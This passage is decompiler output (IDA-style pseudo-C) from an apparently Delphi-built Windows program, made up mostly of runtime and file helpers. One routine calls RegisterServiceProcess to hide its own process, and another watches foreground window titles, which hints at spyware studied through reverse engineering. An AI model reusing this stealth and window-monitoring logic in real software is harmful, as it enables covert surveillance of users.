// 42C8B4: using guessed type int dword_42C8B4;
// 42C8B8: using guessed type int dword_42C8B8;
// 42C8BC: using guessed type int dword_42C8BC;
// 42C8C0: using guessed type int dword_42C8C0;
// 42C8C4: using guessed type int dword_42C8C4;
// 42C8C8: using guessed type int dword_42C8C8;
// 42C8CC: using guessed type int dword_42C8CC;
// 42C8D0: using guessed type int dword_42C8D0;
// 42C8D4: using guessed type int dword_42C8D4;
// 42C8D8: using guessed type int dword_42C8D8;
// 42C8DC: using guessed type int dword_42C8DC;
// 42C8E0: using guessed type int dword_42C8E0;
// 42C8E4: using guessed type int dword_42C8E4;
// 42C8E8: using guessed type int dword_42C8E8;
// 42C8EC: using guessed type int dword_42C8EC;
// 42C8F0: using guessed type int dword_42C8F0;

//----- (0040B968) --------------------------------------------------------
int __usercall sub_40B968@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( sub_40B5FC() )
    return dword_42C898(a1, a2, a3);
  else
    return 0;
}
// 42C898: invalid function type '?' has been ignored
// 42C898: using guessed type int (__stdcall *dword_42C898)(_DWORD, _DWORD, _DWORD);

//----- (0040B98C) --------------------------------------------------------
int __userpurge sub_40B98C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  if ( sub_40B5FC() )
    return dword_42C89C(a1, a2, a3, a4);
  else
    return 0;
}
// 42C89C: invalid function type '?' has been ignored
// 42C89C: using guessed type int (__stdcall *dword_42C89C)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040B9BC) --------------------------------------------------------
int __userpurge sub_40B9BC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  if ( sub_40B5FC() )
    return dword_42C8A0(a1, a2, a3, a4);
  else
    return 0;
}
// 42C8A0: invalid function type '?' has been ignored
// 42C8A0: using guessed type int (__stdcall *dword_42C8A0)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040B9EC) --------------------------------------------------------
int __userpurge sub_40B9EC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  if ( sub_40B5FC() )
    return dword_42C8A4(a1, a2, a3, a4);
  else
    return 0;
}
// 42C8A4: invalid function type '?' has been ignored
// 42C8A4: using guessed type int (__stdcall *dword_42C8A4)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040BA1C) --------------------------------------------------------
int __userpurge sub_40BA1C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  if ( sub_40B5FC() )
    return dword_42C8B8(a1, a2, a3, a4);
  else
    return 0;
}
// 42C8B8: invalid function type '?' has been ignored
// 42C8B8: using guessed type int (__stdcall *dword_42C8B8)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040BA4C) --------------------------------------------------------
int sub_40BA4C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40BA71;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42C890;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C890: using guessed type int dword_42C890;

//----- (0040BA7C) --------------------------------------------------------
void sub_40BA7C()
{
  --dword_42C890;
}
// 42C890: using guessed type int dword_42C890;

//----- (0040BC60) --------------------------------------------------------
int sub_40BC60()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40BD05;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42C8F4 )
  {
    sub_404CE4((int *)&off_42B2EC, (char *)dword_40105C, 3);
    sub_404CE4((int *)off_42B2E0, (char *)dword_40105C, 3);
    sub_404CE4((int *)&off_42B2D4, (char *)dword_40105C, 3);
    sub_404CE4((int *)&off_42B2C8, (char *)dword_40105C, 3);
    sub_404CE4((int *)off_42B2BC, (char *)dword_40105C, 3);
    sub_404CE4((int *)off_42B2B0, (char *)dword_40105C, 3);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40105C: using guessed type int dword_40105C[2];
// 42B2B0: using guessed type char *off_42B2B0[2];
// 42B2BC: using guessed type char *off_42B2BC[2];
// 42B2C8: using guessed type char *off_42B2C8;
// 42B2D4: using guessed type char *off_42B2D4;
// 42B2E0: using guessed type char *off_42B2E0[2];
// 42B2EC: using guessed type char *off_42B2EC;
// 42C8F4: using guessed type int dword_42C8F4;

//----- (0040BD10) --------------------------------------------------------
void sub_40BD10()
{
  --dword_42C8F4;
}
// 42C8F4: using guessed type int dword_42C8F4;

//----- (0040BD18) --------------------------------------------------------
int sub_40BD18()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40BD3D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42C8F8;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C8F8: using guessed type int dword_42C8F8;

//----- (0040BD48) --------------------------------------------------------
void sub_40BD48()
{
  --dword_42C8F8;
}
// 42C8F8: using guessed type int dword_42C8F8;

//----- (0040BD50) --------------------------------------------------------
HMODULE sub_40BD50()
{
  unsigned int v0; // eax
  bool v1; // cf
  HMODULE result; // eax

  v0 = sub_40D394() - 1;
  v1 = v0 < 2;
  result = (HMODULE)(v0 - 2);
  if ( !v1 )
  {
    result = LoadLibraryA("pdh.dll");
    hLibModule = result;
    if ( (unsigned int)result >= 0x20 )
    {
      dword_42C8FC = (int)GetProcAddress_0(hLibModule, "PdhOpenQuery");
      dword_42C900 = (int)GetProcAddress_0(hLibModule, "PdhAddCounterA");
      dword_42C904 = (int)GetProcAddress_0(hLibModule, "PdhCollectQueryData");
      dword_42C910 = (int)GetProcAddress_0(hLibModule, "PdhGetFormattedCounterValue");
      dword_42C908 = (int)GetProcAddress_0(hLibModule, "PdhRemoveCounter");
      result = (HMODULE)GetProcAddress_0(hLibModule, "PdhCloseQuery");
      dword_42C90C = (int)result;
      if ( !dword_42C8FC || !dword_42C900 || !dword_42C904 || !dword_42C910 || !dword_42C908 || !dword_42C90C )
      {
        FreeLibrary_0(hLibModule);
        result = 0;
        hLibModule = 0;
      }
    }
  }
  return result;
}
// 42C8FC: using guessed type int dword_42C8FC;
// 42C900: using guessed type int dword_42C900;
// 42C904: using guessed type int dword_42C904;
// 42C908: using guessed type int dword_42C908;
// 42C90C: using guessed type int dword_42C90C;
// 42C910: using guessed type int dword_42C910;

//----- (0040BEA8) --------------------------------------------------------
BOOL sub_40BEA8()
{
  BOOL result; // eax

  if ( (unsigned int)hLibModule >= 0x20 )
    return FreeLibrary_0(hLibModule);
  return result;
}

//----- (0040BEC0) --------------------------------------------------------
int sub_40BEC0()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40BEE5;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42C918;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C918: using guessed type int dword_42C918;

//----- (0040BEF0) --------------------------------------------------------
void sub_40BEF0()
{
  --dword_42C918;
}
// 42C918: using guessed type int dword_42C918;

//----- (0040BFB4) --------------------------------------------------------
HMODULE sub_40BFB4()
{
  HMODULE result; // eax
  FARPROC ProcAddress_0; // ebx
  DWORD CurrentProcessId; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v4; // [esp-8h] [ebp-14h]
  int *v5; // [esp-4h] [ebp-10h]
  void *v6; // [esp+0h] [ebp-Ch]
  HMODULE hModule; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = LoadLibraryA("kernel32.dll");
  hModule = result;
  if ( (unsigned int)result >= 0x20 )
  {
    ProcAddress_0 = GetProcAddress_0(hModule, "RegisterServiceProcess");
    if ( ProcAddress_0 )
    {
      v5 = &savedregs;
      v4 = &loc_40C01D;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      CurrentProcessId = GetCurrentProcessId();
      ((void (__stdcall *)(DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *))ProcAddress_0)(
        CurrentProcessId,
        1,
        ExceptionList);
      __writefsdword(0, (unsigned int)v4);
      v6 = &loc_40C024;
      return (HMODULE)FreeLibrary_0(hModule);
    }
    else
    {
      return (HMODULE)FreeLibrary_0(hModule);
    }
  }
  return result;
}

//----- (0040C054) --------------------------------------------------------
HWND __usercall sub_40C054@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>)
{
  HWND ForegroundWindow; // ebx
  HWND v5; // esi
  char v6; // zf
  char *v8; // [esp-10h] [ebp-23Ch]
  char *v9; // [esp-10h] [ebp-23Ch]
  unsigned int v10[2]; // [esp-Ch] [ebp-238h] BYREF
  int *v11; // [esp-4h] [ebp-230h]
  char *v12; // [esp+Ch] [ebp-220h] BYREF
  char *v13; // [esp+10h] [ebp-21Ch] BYREF
  char *v14; // [esp+14h] [ebp-218h] BYREF
  char *v15; // [esp+18h] [ebp-214h] BYREF
  char *v16; // [esp+1Ch] [ebp-210h] BYREF
  CHAR String[255]; // [esp+21h] [ebp-20Bh] BYREF
  CHAR ClassName[256]; // [esp+120h] [ebp-10Ch] BYREF
  char *v19; // [esp+220h] [ebp-Ch] BYREF
  int v20; // [esp+224h] [ebp-8h]
  int v21; // [esp+228h] [ebp-4h]
  int savedregs; // [esp+22Ch] [ebp+0h] BYREF

  v13 = 0;
  v12 = 0;
  v16 = 0;
  v14 = 0;
  v15 = 0;
  v19 = 0;
  v20 = a2;
  v21 = a1;
  sub_40470C(a1);
  sub_40470C(v20);
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_40C1BA;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  ForegroundWindow = GetForegroundWindow();
  v5 = 0;
  if ( ForegroundWindow )
  {
    sub_402E48(ClassName, 256, 0);
    GetClassNameA(ForegroundWindow, ClassName, 256);
    sub_4044D4(&v15, ClassName, 256);
    sub_40C214((int)v15, &v16);
    v8 = v16;
    sub_40C214(v21, &v14);
    Delphi_CompareCall_404668((int)v8, (int *)v14);
    if ( v6 )
    {
      if ( GetWindowTextA(ForegroundWindow, String, 255) > 0 )
      {
        sub_40C65C(String, &v19);
        sub_40C214((int)v19, &v13);
        v9 = v13;
        sub_40C214(v20, &v12);
        if ( (int)sub_404804(v12, v9) <= 0 )
        {
          v5 = 0;
        }
        else
        {
          sub_4042C0(a3, (__int32)v19);
          v5 = ForegroundWindow;
        }
      }
    }
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_40C1C1;
  sub_404290((int)&v12, 5);
  sub_404290((int)&v19, 3);
  return v5;
}
// 40C126: variable 'v6' is possibly undefined

//----- (0040C1CC) --------------------------------------------------------
_DWORD *__usercall sub_40C1CC@<eax>(int a1@<eax>, char **a2@<edx>, int a3@<esi>)
{
  int v4; // edx
  int v5; // eax
  int v8; // [esp+4h] [ebp-Ch]

  v8 = sub_404524(a1);
  v4 = v8;
  if ( v8 > 0 )
  {
    v5 = 1;
    do
    {
      if ( *(_BYTE *)(a1 + v5 - 1) == 92 )
        a3 = v5;
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  return Delphi_Copy_40477C(a1, a3 + 1, v8 - a3, a2);
}

//----- (0040C214) --------------------------------------------------------
_DWORD *__usercall sub_40C214@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v4; // ebx
  _DWORD *result; // eax
  _BYTE *v6; // edx
  char *i; // esi

  v4 = sub_404524(a1);
  result = sub_40484C(a2, v4);
  v6 = (_BYTE *)a1;
  for ( i = *a2; v4; --v4 )
  {
    LOBYTE(result) = *v6;
    if ( *v6 >= 0x61u && (unsigned __int8)result <= 0x7Au )
      LOBYTE(result) = (_BYTE)result - 32;
    *i = (char)result;
    ++v6;
    ++i;
  }
  return result;
}

//----- (0040C250) --------------------------------------------------------
_DWORD *__usercall sub_40C250@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v4; // ebx
  _DWORD *result; // eax
  _BYTE *v6; // edx
  char *i; // esi

  v4 = sub_404524(a1);
  result = sub_40484C(a2, v4);
  v6 = (_BYTE *)a1;
  for ( i = *a2; v4; --v4 )
  {
    LOBYTE(result) = *v6;
    if ( *v6 >= 0x41u && (unsigned __int8)result <= 0x5Au )
      LOBYTE(result) = (_BYTE)result + 32;
    *i = (char)result;
    ++v6;
    ++i;
  }
  return result;
}

//----- (0040C28C) --------------------------------------------------------
int __usercall sub_40C28C@<eax>(char *a1@<eax>)
{
  char *v1; // eax
  HANDLE FirstFileA_0; // eax
  struct _WIN32_FIND_DATAA FindFileData; // [esp+4h] [ebp-14Ch] BYREF
  struct _FILETIME LocalFileTime; // [esp+144h] [ebp-Ch] BYREF
  WORD FatDate[2]; // [esp+14Ch] [ebp-4h] BYREF

  v1 = sub_40471C(a1);
  FirstFileA_0 = FindFirstFileA_0(v1, &FindFileData);
  if ( FirstFileA_0 == (HANDLE)-1
    || (FindClose_0(FirstFileA_0), (FindFileData.dwFileAttributes & 0x10) != 0)
    || (FileTimeToLocalFileTime(&FindFileData.ftLastWriteTime, &LocalFileTime),
        !FileTimeToDosDateTime(&LocalFileTime, &FatDate[1], FatDate)) )
  {
    *(_DWORD *)FatDate = -1;
  }
  return *(_DWORD *)FatDate;
}

//----- (0040C2F4) --------------------------------------------------------
bool __usercall sub_40C2F4@<al>(char *a1@<eax>)
{
  return sub_40C28C(a1) != -1;
}

//----- (0040C304) --------------------------------------------------------
DWORD __usercall sub_40C304@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>)
{
  DWORD NumberOfBytesRead; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesRead = nNumberOfBytesToRead;
  if ( !ReadFile_0(a3, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    return -1;
  return NumberOfBytesRead;
}

//----- (0040C330) --------------------------------------------------------
DWORD __usercall sub_40C330@<eax>(DWORD nNumberOfBytesToWrite@<ecx>, LPCVOID lpBuffer@<edx>, void *a3@<eax>)
{
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesWritten = nNumberOfBytesToWrite;
  if ( !WriteFile_0(a3, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
    return -1;
  return NumberOfBytesWritten;
}

//----- (0040C35C) --------------------------------------------------------
BOOL __usercall sub_40C35C@<eax>(void *a1@<eax>)
{
  return CloseHandle_0(a1);
}

//----- (0040C364) --------------------------------------------------------
DWORD __usercall sub_40C364@<eax>(DWORD dwMoveMethod@<ecx>, LONG lDistanceToMove@<edx>, void *a3@<eax>)
{
  return SetFilePointer_0(a3, lDistanceToMove, 0, dwMoveMethod);
}

//----- (0040C370) --------------------------------------------------------
HANDLE __usercall sub_40C370@<eax>(char *a1@<eax>)
{
  char *v1; // eax

  v1 = sub_40471C(a1);
  return CreateFileA_0(v1, 0xC0000000, 0, 0, 2u, 0x80u, 0);
}

//----- (0040C394) --------------------------------------------------------
int __usercall sub_40C394@<eax>(char *a1@<eax>, char a2@<dl>)
{
  int result; // eax
  unsigned int v4; // esi
  char *v5; // eax
  DWORD v6; // [esp-18h] [ebp-24h]
  DWORD v7; // [esp-14h] [ebp-20h]

  result = -1;
  v4 = a2 & 3;
  if ( v4 <= 2 && (unsigned __int8)(a2 & 0xF0) >> 4 <= 0x40u )
  {
    v7 = dword_42B304[(unsigned __int8)(a2 & 0xF0) >> 4];
    v6 = dword_42B2F8[v4];
    v5 = sub_40471C(a1);
    return (int)CreateFileA_0(v5, v6, v7, 0, 3u, 0x80u, 0);
  }
  return result;
}
// 42B2F8: using guessed type DWORD dword_42B2F8[3];
// 42B304: using guessed type DWORD dword_42B304[5];

//----- (0040C3F0) --------------------------------------------------------
_DWORD *__usercall sub_40C3F0@<eax>(char *a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>)
{
  void *v5; // ebx
  int v6; // edi
  int v7; // edi
  unsigned int v9[2]; // [esp-Ch] [ebp-40h] BYREF
  int *v10; // [esp-4h] [ebp-38h]
  __int32 v11; // [esp+Ch] [ebp-28h] BYREF
  __int32 v12; // [esp+10h] [ebp-24h] BYREF
  __int32 v13; // [esp+14h] [ebp-20h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+18h] [ebp-1Ch] BYREF
  struct _FILETIME CreationTime; // [esp+28h] [ebp-Ch] BYREF
  char *v16; // [esp+30h] [ebp-4h] BYREF
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v13 = 0;
  v12 = 0;
  v11 = 0;
  v16 = a1;
  sub_40470C((int)a1);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_40C4FF;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v5 = (void *)sub_40C394(v16, 64);
  sub_40426C(a3);
  if ( v5 )
  {
    v6 = a2 - 1;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( v7 )
      {
        if ( v7 == 1 )
          GetFileTime(v5, 0, 0, &CreationTime);
      }
      else
      {
        GetFileTime(v5, 0, &CreationTime, 0);
      }
    }
    else
    {
      GetFileTime(v5, &CreationTime, 0, 0);
    }
    FileTimeToLocalFileTime(&CreationTime, &CreationTime);
    FileTimeToSystemTime(&CreationTime, &SystemTime);
    sub_40C670(SystemTime.wYear, &v13);
    sub_40C670(SystemTime.wMonth, &v12);
    sub_40C670(SystemTime.wDay, &v11);
    sub_4045E4(a3, 5);
  }
  sub_40C35C(v5);
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_40C506;
  sub_404290((int)&v11, 3);
  return sub_40426C(&v16);
}

//----- (0040C51C) --------------------------------------------------------
int __usercall sub_40C51C@<eax>(volatile __int32 *a1@<eax>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-38h] BYREF
  void *v4; // [esp-8h] [ebp-34h]
  int *v5; // [esp-4h] [ebp-30h]
  void *v6; // [esp+0h] [ebp-2Ch]
  __int32 v7; // [esp+4h] [ebp-28h] BYREF
  __int32 v8; // [esp+8h] [ebp-24h] BYREF
  __int32 v9; // [esp+Ch] [ebp-20h] BYREF
  __int32 v10; // [esp+10h] [ebp-1Ch] BYREF
  __int32 v11; // [esp+14h] [ebp-18h] BYREF
  __int32 v12; // [esp+18h] [ebp-14h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+1Ch] [ebp-10h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v5 = &savedregs;
  v4 = &loc_40C5DF;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  GetLocalTime(&SystemTime);
  sub_40C670(SystemTime.wYear, &v12);
  sub_40C670(SystemTime.wMonth, &v11);
  sub_40C670(SystemTime.wDay, &v10);
  sub_40C670(SystemTime.wHour, &v9);
  sub_40C670(SystemTime.wMinute, &v8);
  sub_40C670(SystemTime.wSecond, &v7);
  sub_4045E4(a1, 11);
  __writefsdword(0, (unsigned int)v4);
  v6 = &loc_40C5E6;
  return sub_404290((int)&v7, 6);
}

//----- (0040C610) --------------------------------------------------------
int __usercall sub_40C610@<eax>(int a1@<eax>, char *a2@<ecx>)
{
  char *v3; // [esp-4h] [ebp-4h] BYREF

  v3 = a2;
  return sub_402E68(a1, &v3);
}

//----- (0040C61C) --------------------------------------------------------
unsigned int __usercall sub_40C61C@<eax>(const char *a1@<eax>)
{
  return strlen(a1);
}

//----- (0040C634) --------------------------------------------------------
char *__usercall sub_40C634@<eax>(char *result@<eax>, const char *a2@<edx>)
{
  strcpy(result, a2);
  return result;
}

//----- (0040C65C) --------------------------------------------------------
_DWORD *__usercall sub_40C65C@<eax>(char *a1@<eax>, char **a2@<edx>)
{
  return sub_40445C(a2, a1);
}

//----- (0040C670) --------------------------------------------------------
_DWORD *__usercall sub_40C670@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  unsigned int v5[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v6; // [esp-10h] [ebp-14h]
  char *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_40C6DE;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_40426C(a2);
  while ( a1 )
  {
    a1 /= 10;
    sub_40444C(&v7);
    sub_404570(a2, v7, *(char **)a2);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40C6E5;
  return sub_40426C(&v7);
}

//----- (0040C6EC) --------------------------------------------------------
bool __usercall sub_40C6EC@<al>(HINSTANCE a1@<eax>, int a2@<edx>)
{
  int StringA_0; // eax
  CHAR Buffer[1032]; // [esp+0h] [ebp-408h] BYREF

  StringA_0 = LoadStringA_0(a1, *(_DWORD *)a2, Buffer, 1024);
  sub_40435C((char **)(a2 + 4), Buffer, StringA_0);
  return *(_DWORD *)(a2 + 4) == 0;
}

//----- (0040C728) --------------------------------------------------------
int __usercall sub_40C728@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  unsigned int v5[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v6; // [esp-4h] [ebp-14h]
  int v7; // [esp+8h] [ebp-8h] BYREF
  __int32 v8; // [esp+Ch] [ebp-4h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  sub_404BEC((int)&v7, (int)dword_40BEFC);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_40C78E;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v7 = a1;
  sub_40426C(&v8);
  sub_405DA0((int)sub_40C6EC);
  sub_4042C0(a2, v8);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40C795;
  return sub_404CB0((int)&v7, (int)dword_40BEFC);
}
// 40BEFC: using guessed type int dword_40BEFC[4];

//----- (0040C79C) --------------------------------------------------------
int __usercall sub_40C79C@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  return sub_40C728(a1, a2);
}

//----- (0040C7B0) --------------------------------------------------------
char *__usercall sub_40C7B0@<eax>(int a1@<eax>)
{
  char *v2; // esi

  v2 = (char *)sub_4026E0(a1);
  sub_402E48(v2, a1, 0);
  return v2;
}

//----- (0040C7D4) --------------------------------------------------------
_DWORD *__usercall sub_40C7D4@<eax>(_DWORD *a1@<eax>)
{
  return sub_40426C(a1);
}

//----- (0040C7E0) --------------------------------------------------------
int __fastcall sub_40C7E0(int a1, int a2)
{
  return sub_4050E0(a1, a2);
}
// 4050E0: using guessed type int __fastcall sub_4050E0(_DWORD, _DWORD);

//----- (0040C7F4) --------------------------------------------------------
void __stdcall sub_40C7F4(int a1, int a2, int a3)
{
  ;
}

//----- (0040C7FC) --------------------------------------------------------
unsigned __int8 *__userpurge sub_40C7FC@<eax>(
        int a1@<eax>,
        unsigned int a2@<edx>,
        unsigned __int8 *a3@<ecx>,
        int a4,
        int a5,
        int a6)
{
  unsigned __int8 *v6; // edi
  unsigned __int8 *v7; // esi
  unsigned __int8 *v8; // ecx
  unsigned __int8 v9; // al
  unsigned __int8 *result; // eax
  int v11; // ebx
  unsigned __int8 v12; // al
  unsigned int v13; // edx
  unsigned __int8 v14; // al
  unsigned int v15; // ecx
  unsigned int v16; // edx
  unsigned int v17; // ebx
  unsigned int v18; // ecx
  unsigned int v19; // ebx
  unsigned int v20; // et0
  bool v21; // cf
  unsigned int v22; // edx
  unsigned __int8 *v23; // edi
  unsigned int v24; // ecx
  unsigned int v25; // [esp-14h] [ebp-8Ch]
  unsigned int v26; // [esp-14h] [ebp-8Ch]
  unsigned __int8 *v27; // [esp-10h] [ebp-88h]
  unsigned __int8 *v28; // [esp+50h] [ebp-28h]
  unsigned int v29; // [esp+58h] [ebp-20h]
  unsigned __int8 v30; // [esp+5Fh] [ebp-19h]
  int v31; // [esp+68h] [ebp-10h] BYREF
  int v32; // [esp+6Ch] [ebp-Ch]
  int v33; // [esp+70h] [ebp-8h]
  int v34; // [esp+74h] [ebp-4h]
  int savedregs; // [esp+78h] [ebp+0h] BYREF

  v6 = (unsigned __int8 *)a1;
  v7 = a3;
  v34 = 0;
  v8 = &a3[a6];
  v33 = a1;
  v32 = 0;
  v31 = 0;
LABEL_2:
  if ( a2 )
  {
    while ( v7 != v8 )
    {
      v9 = *v7++;
      if ( v9 == 37 )
      {
        if ( v7 == v8 )
          break;
        v9 = *v7++;
        if ( v9 != 37 )
        {
          v11 = (int)(v7 - 2);
          while ( 1 )
          {
            v30 = v9;
            if ( v9 == 45 )
            {
              if ( v7 == v8 )
                goto LABEL_6;
              v9 = *v7++;
            }
            v12 = sub_40C8DE(v9, v8, (int)&savedregs, v7);
            if ( v12 != 58 )
              break;
            v32 = v11;
            if ( v7 == v8 )
              goto LABEL_6;
            v9 = *v7++;
          }
          v29 = v11;
          if ( v12 == 46 )
          {
            if ( v7 == v8 )
              break;
            v14 = *v7++;
            v12 = sub_40C8DE(v14, v8, (int)&savedregs, v7);
          }
          v28 = v7;
          v27 = v8;
          v25 = v13;
          sub_40C926(v12, (int)&savedregs, (int)v7);
          v16 = v25;
          v17 = v11 - v15;
          if ( v29 < v15 )
            v17 = 0;
          if ( v30 == 45 )
          {
            v16 = v25 - v15;
            if ( v25 < v15 )
            {
              v15 = v25;
              v16 = 0;
            }
            qmemcpy(v6, v7, v15);
            v7 += v15;
            v6 += v15;
            v15 = 0;
          }
          v20 = v17;
          v19 = v15;
          v18 = v20;
          v21 = v16 < v20;
          v22 = v16 - v20;
          if ( v21 )
          {
            v18 += v22;
            v22 = 0;
          }
          memset(v6, 32, v18);
          v23 = &v6[v18];
          v24 = v19;
          v21 = v22 < v19;
          a2 = v22 - v19;
          if ( v21 )
          {
            v24 = a2 + v19;
            a2 = 0;
          }
          qmemcpy(v23, v7, v24);
          v6 = &v23[v24];
          if ( v31 )
          {
            v26 = a2;
            sub_40C7D4(&v31);
            a2 = v26;
          }
          v8 = v27;
          v7 = v28;
          goto LABEL_2;
        }
      }
      *v6++ = v9;
      if ( !--a2 )
        break;
    }
  }
LABEL_6:
  result = &v6[-v33];
  sub_40CBF0((int)&savedregs);
  return result;
}
// 40C858: variable 'v8' is possibly undefined
// 40C88B: variable 'v13' is possibly undefined
// 40C895: variable 'v15' is possibly undefined

//----- (0040C8DE) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned __int8 __usercall sub_40C8DE@<al>(
        unsigned __int8 result@<al>,
        unsigned __int8 *a2@<ecx>,
        int a3@<ebp>,
        unsigned __int8 *a4@<esi>)
{
  int v4; // ebx

  v4 = 0;
  if ( result == 42 )
  {
    if ( *(_DWORD *)(a3 - 12) <= *(_DWORD *)(a3 + 8) )
      ++*(_DWORD *)(a3 - 12);
    if ( a4 == a2 )
LABEL_12:
      JUMPOUT(0x40C836);
    return *a4;
  }
  else
  {
    while ( result >= 0x30u && result <= 0x39u )
    {
      v4 = (unsigned __int8)(result - 48) + 10 * v4;
      if ( a4 == a2 )
        goto LABEL_12;
      result = *a4++;
    }
  }
  return result;
}
// 40C901: positive sp value 4 has been found
// 40C901: control flows out of bounds to 40C836

//----- (0040C926) --------------------------------------------------------
void __usercall sub_40C926(char a1@<al>, int a2@<ebp>, int a3@<esi>)
{
  char v3; // cl
  unsigned int v4; // ebx
  signed int v5; // eax
  _DWORD *v6; // ebx
  bool v7; // cf
  void *v8; // esi
  _BYTE *v9; // edi
  int v10; // ecx
  bool v11; // zf
  unsigned int v12; // eax
  unsigned int v13; // edx

  v3 = a1 & 0xDF;
  v4 = *(_DWORD *)(a2 - 12);
  if ( v4 > *(_DWORD *)(a2 + 8) )
    goto LABEL_3;
  ++*(_DWORD *)(a2 - 12);
  a3 = *(_DWORD *)(a2 + 12) + 8 * v4;
  v5 = *(_DWORD *)a3;
  switch ( *(_BYTE *)(a3 + 4) )
  {
    case 0:
      switch ( v3 )
      {
        case 'D':
          if ( v5 < 0 )
          {
            sub_40CA7A(-v5, a2);
            *(_BYTE *)(a3 - 1) = 45;
            return;
          }
          goto LABEL_54;
        case 'U':
LABEL_54:
          sub_40CA7A(v5, a2);
          return;
        case 'X':
LABEL_55:
          JUMPOUT(0x40CA7F);
      }
LABEL_3:
      while ( 1 )
      {
        sub_40CBF0(a2);
        v5 = nullsub_1(*(_DWORD *)(a2 - 40) - *(_DWORD *)(a2 - 24));
LABEL_4:
        v6 = (_DWORD *)(a2 - 48);
        *v6 = *(_DWORD *)v5;
        v6[1] = *(_DWORD *)(v5 + 4);
        if ( v3 == 68 )
          break;
        if ( v3 == 85 )
          goto LABEL_51;
        if ( v3 == 88 )
          JUMPOUT(0x40C9EE);
      }
